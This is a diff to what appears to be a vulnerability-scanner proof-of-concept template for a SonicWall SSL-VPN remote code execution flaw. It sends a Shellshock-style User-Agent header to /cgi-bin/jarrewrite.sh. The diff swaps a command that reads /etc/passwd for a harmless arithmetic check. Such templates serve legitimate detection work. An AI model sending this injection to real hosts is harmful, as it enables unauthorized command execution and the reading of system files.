@@ -1,11 +1,14 @@
 name: poc-yaml-sonicwall-ssl-vpn-rce
+set:
+  r1: randomInt(800000000, 1000000000)
+  r2: randomInt(800000000, 1000000000)
 rules:
   - method: GET
     path: /cgi-bin/jarrewrite.sh
     headers:
-      User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
-    expression: |
-      response.status == 200 && response.body.bcontains(b":root:")
+      User-Agent: () { :; }; echo ; /bin/bash -c 'expr {{r1}} + {{r2}}'
+    expression:
+      response.body.bcontains(bytes(string(r1 + r2)))
 detail:
   author: sakura404x
   links:
